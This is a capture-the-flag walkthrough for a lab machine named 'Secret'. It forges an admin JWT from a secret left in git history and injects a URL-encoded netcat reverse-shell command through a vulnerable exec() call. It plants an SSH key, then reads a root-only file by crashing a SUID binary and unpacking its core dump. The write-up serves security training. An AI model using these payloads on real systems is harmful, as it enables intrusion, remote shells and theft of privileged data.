# SECRET
### User Flag

```bash
[kali@kali ~]$ sudo nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.11.120
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
3000/tcp open  ppp     syn-ack ttl 63
```

We can try to follow the tutorial in the webpage to create an account, for example, using burp.

```
POST /api/user/register HTTP/1.1
Accept: application/json
Content-Type: application/json
Content-Length: 85

{
	"name": "Dasor_",
	"email": "testmail@mail.com",
	"password": "testtest"
}
```

Now, we log in:

```
POST /api/user/login HTTP/1.1
Accept: application/json
Content-Type: application/json
Content-Length: 85

{
	"email": "testmail@mail.com",
	"password": "testtest"
}
```

And we get our JWT token, but it is pretty useless since when we connect to `/api/priv` we just get a message telling us that we are normal users.

Now, we can download the source code of the page, which is in the main page (in `/download/files.zip`). If we take a look at `/routes/private.js`, we see that to be admin, the user's name must be `theadmin`. So we need to fake our JWT token, but first we need the secret. We find that there is a git repository of the source code of the webpage. If we take a look at the commits:

```bash
[kali@kali ~]$ git log --oneline     
e297a27 (HEAD -> master) now we can view logs from server 😃
67d8da7 removed .env for security reasons
de0a46b added /downloads
4e55472 removed swap
3a367e7 added downloads
55fe756 first commit
```

and we take a look at the commit `67d8da7`, we'll find the secret. Now, we can create a JWT token with name 'theadmin' using, for example, `jwt.io`. With this token, the page says that we are admin, but we cannot do anything in the webpage. However, in the file `private.js`, we find:

```javascript
if (name == 'theadmin'){
    const getLogs = `git log --oneline ${file}`;
    exec(getLogs, (err , output) =>{
    if(err){
        res.status(500).send(err);
        return
    }
    ...
```

We can exploit the `exec` function and create a reverse shell using netcat (note that `nc -e` doesn't work on this machine):

```bash
[kali@kali ~]$ nc -lnvvvp 4444
listening on [any] 4444 ...
```
Now we exploit the `exec` function using burp with this request:

```
GET /api/logs?file=;mknod%20/tmp/backpipe%20p;%20/usr/bin/bash%200</tmp/backpipe%20|%20nc%2010.10.14.196%204444%201>%20/tmp/backpipe HTTP/1.1
...
auth-token: !!! your admin token !!!
```

with which we get user access:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
dasith@secret:~/local-web$ cat /home/dasith/user.txt
```

### Root flag

__TIP:__ _We can add our own ssh key to make the work flow easier_

```bash
dasith@secret:~/local-web$ cd /home/dasith/.ssh
dasith@secret:~/local-web$ echo 'yourkey' >> authorized_keys
```

In `/opt` we find a program called `count` that has the SUID bit set and is owned by root. Then, it can give us information about any file or directory. If we look at the code in code.c, we find:

```c
// drop privs to limit file write
setuid(getuid());
// Enable coredump generation
prctl(PR_SET_DUMPABLE, 1);
```

which means that, the program reads the file, then drops the privileges to the normal user and, if the program crashes, it will store a crash report in some location (readable by the normal user). The default route is `/var/crash`. Because the crash will contain the memory of the process, we can exploit this program to do privilege scalation:

```bash
dasith@secret:/opt$ ./count
Enter source file/directory name: /root/root.txt

Total characters = 33
Total words      = 2
Total lines      = 2
Save results a file? [y/N]: ^Z
[1]+  Stopped                 ./count
dasith@secret:/opt$ ps -aux | grep count
root         827  0.0  0.1 235668  7404 ?        Ssl  20:16   0:00 /usr/lib/accountsservice/accounts-daemon
dasith      1688  0.0  0.0   2488   592 pts/3    T    20:20   0:00 ./count
dasith      1691  0.0  0.0   6432   668 pts/3    S+   20:21   0:00 grep --color=auto count

dasith@secret:/opt$ kill -11 1688
dasith@secret:/opt$ fg
./count
Segmentation fault (core dumped)
```

Now that we have created a crash report, we need to make it readable by using:

```bash
dasith@secret:/opt$ apport-unpack /var/crash/_opt_count.1000.crash /tmp/crash-report
```

Finally, we can read the process memory in the `CoreDump` file in `/tmp/crash-report`, which contains the file read by the process.
